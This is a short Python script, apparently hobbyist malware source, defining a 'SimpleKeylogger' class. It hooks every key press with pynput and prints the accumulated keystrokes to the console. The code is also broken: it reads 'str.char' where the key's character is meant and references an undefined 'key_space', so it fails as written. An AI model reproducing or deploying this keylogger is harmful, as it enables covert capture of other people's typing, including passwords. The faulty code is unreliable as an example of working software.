import pynput.keyboard

class SimpleKeylogger:
	def __init__(self):
		self.logger = ""
	
	def append_to_log(self,key_strike):
		self.logger = self.logger + key_strike
		self.logger = self.logger
	
		print(self.logger)

	def evaluate_keys(self, key):
		try:
			Pressed_key = (str.char)
		except AttributeError:
			if key == key_space:
				Pressed_key = ""
			else:
				Pressed_key = "" + str(key) + ""
			
		self.append_to_log(Pressed_key)

	def run(self):
		keyboard_listener = pynput.keyboard.Listener(on_press = self.evaluate_keys)
		with keyboard_listener:
			self.logger = ""
			keyboard_listener.join()


SimpleKeylogger().run()
